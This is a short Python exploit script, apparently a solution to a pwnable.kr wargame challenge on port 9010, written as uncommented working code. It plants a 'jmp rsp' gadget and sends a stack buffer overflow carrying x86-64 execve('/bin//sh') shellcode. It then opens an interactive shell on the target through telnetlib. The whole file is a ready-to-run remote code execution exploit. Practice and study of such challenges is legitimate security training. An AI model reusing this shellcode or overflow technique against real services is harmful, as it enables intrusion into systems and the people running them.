#! /usr/bin/python

import sys
import struct
import socket
import telnetlib

shellcode = "\x48\x31\xc0\x48\x83\xc0\x3b\x48\x31\xff\x57\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xd2\x0f\x05"

if sys.byteorder == 'little':
	Q = lambda x: struct.pack("<Q", x)
elif sys.byteorder == 'big':
	Q = lambda x: struct.pack(">Q", x)

try:
	s = socket.create_connection(('pwnable.kr', 9010))
except socket.gaierror as e:
	(n, q) = e

	sys.exit(-1)

try:
	# send "jmpq *%rsp" payload at first..
	s.send("\xff\xe4" + chr(0x0a))
except socket.error as e:
	(n, q) = e

	sys.exit(-1)

try:
	s.send("1" + chr(0x0a))
except socket.error as e:
	(n, q) = e

	sys.exit(-1)

try:
	# send payload..
	s.send("\x41"*(40) + Q(0x6020a0) + shellcode + chr(0x0a))
except socket.error as e:
	(n, q) = e

	sys.exit(-1)

t = telnetlib.Telnet()
t.sock = s
t.interact()
